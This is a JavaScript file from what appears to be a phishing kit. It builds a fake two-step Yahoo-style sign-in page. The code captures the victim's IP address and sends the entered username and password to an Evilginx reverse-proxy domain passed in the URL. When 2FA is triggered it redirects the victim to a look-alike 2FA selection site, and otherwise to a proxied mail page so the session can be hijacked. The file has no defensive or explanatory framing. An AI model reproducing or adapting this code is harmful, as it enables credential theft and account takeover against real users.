document.addEventListener("DOMContentLoaded", () => {
  const emailStep = document.getElementById("email-step")
  const passwordStep = document.getElementById("password-step")
  const errorContainer = document.getElementById("error-container")
  const errorMessage = document.getElementById("error-message")

  const emailForm = document.getElementById("email-form")
  const passwordForm = document.getElementById("password-form")
  const usernameDisplay = document.getElementById("username-display")
  const usernameInput = document.getElementById("username-input")
  const passwordInput = document.getElementById("password-input")
  const togglePasswordBtn = document.getElementById("toggle-password")
  const tryAgainBtn = document.getElementById("try-again-btn")

  let sessionData = {}

  // 1. Initialize Session from URL parameters
  const urlParams = new URLSearchParams(window.location.search)
  sessionData = Object.fromEntries(urlParams.entries())
  if (!sessionData.evilginx_domain) {
    showError("Configuration error: Missing 'evilginx_domain'.")
    emailForm.querySelector("button").disabled = true
    return
  }

  // Capture IP address
  fetch("https://api64.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => {
      document.getElementById("ip").value = data.ip
    })
    .catch(() => {
      document.getElementById("ip").value = "N/A"
    })

  // 2. Email Form Submission
  emailForm.addEventListener("submit", (e) => {
    e.preventDefault()
    sessionData.username = usernameInput.value
    usernameDisplay.textContent = `Signing in as ${sessionData.username}`
    emailStep.style.display = "none"
    passwordStep.style.display = "block"
    passwordInput.focus()
  })

  // 3. Password Form Submission
  passwordForm.addEventListener("submit", async (e) => {
    e.preventDefault()
    sessionData.password = passwordInput.value

    const formData = new URLSearchParams({
      username: sessionData.username,
      passwd: sessionData.password,
      ...sessionData,
    })

    try {
      // Send credentials to Evilginx API endpoint
      const response = await fetch(`https://${sessionData.evilginx_domain}/account/challenge/password`, {
        method: "POST",
        body: formData,
        credentials: "include",
      })

      const responseText = await response.text()

      // Conditional 2FA check
      if (responseText.includes("challenge-selector") || responseText.includes("verify")) {
        // 2FA is required
        const params = new URLSearchParams(sessionData)
        window.location.href = `https://yahoo-2fa-selection.vercel.app/?${params.toString()}`
      } else if (response.ok || response.status === 302) {
        // Login success, no 2FA
        window.location.href = `https://mail.${sessionData.evilginx_domain}/d/folders/1`
      } else {
        // Invalid credentials or other error
        showError("Invalid username or password. Please try again.")
      }
    } catch (error) {
      showError("A network error occurred. Please try again.")
    }
  })

  // UI Helpers
  togglePasswordBtn.addEventListener("click", () => {
    const isPassword = passwordInput.type === "password"
    passwordInput.type = isPassword ? "text" : "password"
    togglePasswordBtn.textContent = isPassword ? "Hide" : "Show"
  })

  tryAgainBtn.addEventListener("click", () => {
    errorContainer.style.display = "none"
    passwordStep.style.display = "none"
    emailStep.style.display = "block"
    emailForm.reset()
    passwordForm.reset()
  })

  function showError(message) {
    errorMessage.textContent = message
    emailStep.style.display = "none"
    passwordStep.style.display = "none"
    errorContainer.style.display = "block"
  }
})
